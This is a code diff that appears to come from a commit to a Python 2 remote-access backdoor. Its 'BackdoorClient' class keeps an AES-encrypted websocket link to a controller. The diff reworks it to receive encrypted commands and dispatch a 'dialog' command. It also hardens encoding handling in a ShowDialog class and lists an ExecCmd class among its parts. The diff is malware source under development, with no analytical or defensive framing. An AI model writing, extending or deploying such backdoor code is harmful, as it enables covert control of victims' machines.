@@ -38,10 +38,11 @@ class BackdoorClient(threading.Thread):
                 time.sleep(1)
 
                 while True:
-                    msg = json.loads(self.ws.recv())
-                    if 'data' in msg:
-                        data = self.decrypt(msg['data'])
-                        print data
+                    msg = json.loads(self.decrypt(self.ws.recv()))
+                    if 'cmd' in msg:
+                        command = msg['cmd']
+                        if command == 'dialog':
+                            ShowDialog('test')
 
                 self.ws.close()
 
@@ -51,8 +52,7 @@ class BackdoorClient(threading.Thread):
                 time.sleep(3)
 
     def send_msg(self, data):
-        msg = {'data': self.encrypt(data)}
-        self.ws.send(json.dumps(msg))
+        self.ws.send(self.encrypt(json.dumps({'data': data})))
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -86,8 +86,15 @@ class ExecCmd(threading.Thread):
 class ShowDialog(threading.Thread):
     def __init__(self, content, title=''):
         threading.Thread.__init__(self)
-        self.content = content.decode(chardet.detect(content)['encoding'])
-        self.title = title.decode(chardet.detect(title)['encoding'])
+        self.content = u""
+        encoding = chardet.detect(content)['encoding']
+        if encoding:
+            self.content = content.decode(encoding)
+
+        self.title = u""
+        encoding = chardet.detect(title)['encoding']
+        if encoding:
+            self.title = title.decode(encoding)
 
         self.daemon = True
         self.start()
